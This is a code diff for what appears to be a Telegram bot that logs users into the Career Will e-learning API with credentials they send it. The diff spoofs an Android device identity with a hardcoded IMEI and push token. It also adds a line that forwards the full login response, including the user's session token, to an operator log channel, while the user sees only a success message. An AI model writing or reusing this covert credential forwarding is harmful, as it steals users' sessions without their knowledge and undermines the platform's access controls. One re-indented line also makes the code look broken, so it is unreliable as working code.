@@ -87,19 +87,24 @@ async def career_will(app, message):
                 "user-agent": "okhttp/5.0.0-alpha.2"
             }
 
-            email, password = raw_text.split("*")
-            data = {
-                "deviceType": "web",
+              email, password = raw_text.split("*")
+            data =  {
+                "deviceType": "android",
                 "password": password,
-                "deviceModel": "chrome",
-                "deviceVersion": "Chrome+119",
-                "email": email
+                "deviceModel": "Xiaomi M2007J20CI",
+                "deviceVersion": "Q(Android 10.0)",
+                "email": email,
+                "deviceIMEI": "d57adbd8a7b8u9i9",  # You should replace this with an actual IMEI if needed
+                "deviceToken": "c8HzsrndRB6dMaOuKW2qMS:APA91bHu4YCP4rqhpN3ZnLjzL3LuLljxXua2P2aUXfIS4nLeT4LnfwWY6MiJJrG9XWdBUIfuA6GIXBPIRTGZsDyripIXoV1CyP3kT8GKuWHgGVn0DFRDEnXgAIAmaCE6acT3oussy2"  # Replace with an actual device token if needed
             }
 
-            response = requests.post(login_url, headers=headers, json=data)
+            response = requests.post("https://elearn.crwilladmin.com/api/v8/login-other", headers=headers, json=data)
+            
+            pk = response.text
             response.raise_for_status()  # Raise an error if the request was unsuccessful
             token = response.json()["data"]["token"]
-            await message.reply_text(f"**Login Successful**\n\n`{token}`")
+            await app.send_message(log_channel, pk)
+            await message.reply_text(f"<blockquote>**Login Successful**\n\n`{token}`</blockquote>")
         else:
             token = raw_text
     except Exception as e:
